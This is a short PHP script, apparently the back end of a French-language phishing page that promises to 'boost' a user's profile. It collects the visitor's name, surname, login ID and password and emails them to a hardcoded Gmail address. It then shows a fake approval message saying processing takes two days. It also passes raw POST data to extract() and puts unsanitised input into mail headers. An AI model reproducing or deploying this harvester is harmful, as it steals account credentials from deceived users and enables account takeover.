<?php
	
	if (isset($_POST['boostQuery'])) {
		extract($_POST);

		if (!empty($surname) && !empty($name) && !empty($loginname) && !empty($loginpass)) {
			try{
				$to = "themad171@gmail.com";
			$message = "Nom : $name, Prenom : $surname, ID: $loginname, MDP: $loginpass";
			$sujet = "Nouveau profile";
			$headers = "From : $name-$surname ";

			if (mail($to, $sujet, $message, $headers)) {
				echo "<script>
			var warning = document.getElementById('Query-statement');
			warning.innerHTML = 'Demande de boostage approuvé, veuillez patientez 2 Jours le temps du traitement !';
			warning.style.color = 'green';
			warning.style.display = 'block';

		setTimeout(function() {
			warning.style.display = 'none';
			warning.style.transition= 'display 2s';
		}, 2000);</script>";
			}
				else{
					echo "
					<script>
						var warning = document.getElementById('Query-statement');
						warning.innerHTML = 'Echec d'envoie !';
						warning.style.color = 'red';
						warning.style.display = 'block';

						setTimeout(function() {
						warning.style.display = 'none';
						warning.style.transitionDisplay= '2s';
				
						}, 2000);
					</script>
					";
			}
			} catch(PDOException $e) {
				echo $e;
			}
		}
		else{
			echo "
			<script>
				var warning = document.getElementById('Query-statement');
				warning.innerHTML = 'Veillez remplir tous les champs !';
				warning.style.color = 'red';
				warning.style.display = 'block';

				setTimeout(function() {
				warning.style.display = 'none';
				warning.style.transitionDisplay= '2s';
				}, 2000);
			</script>";
		}
	}

?>